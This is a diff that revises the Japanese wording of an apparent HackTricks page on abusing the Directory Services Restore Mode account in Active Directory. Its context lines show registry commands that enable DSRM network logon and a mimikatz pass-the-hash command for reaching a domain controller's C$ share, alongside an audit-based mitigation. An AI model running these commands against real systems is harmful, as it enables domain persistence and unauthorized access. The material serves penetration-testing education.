@@ -13,16 +13,16 @@ Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLog
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
 ```
-その後、PTHを使用して**C$の内容をリストしたり、シェルを取得したりできます**。そのハッシュをメモリ内で使用して新しいPowerShellセッションを作成する際（PTH用）には、**使用される「ドメイン」はDCマシンの名前だけです。**
+その後、PTHを使用して**C$の内容をリストしたり、シェルを取得したりできます**。そのハッシュをメモリ内で使用して新しいPowerShellセッションを作成する際（PTH用に）**「ドメイン」として使用されるのはDCマシンの名前だけです:**
 ```bash
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
 #And in new spawned powershell you now can access via NTLM the content of C$
 ls \\dc-host-name\C$
 ```
-より詳しい情報は次のリンクを参照してください: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) と [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
+より詳しい情報は、[https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) と [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785) を参照してください。
 
 ## 緩和策
 
-- イベント ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` の作成/変更の監査
+- イベント ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` の監査作成/変更
 
 {{#include ../../banners/hacktricks-training.md}}
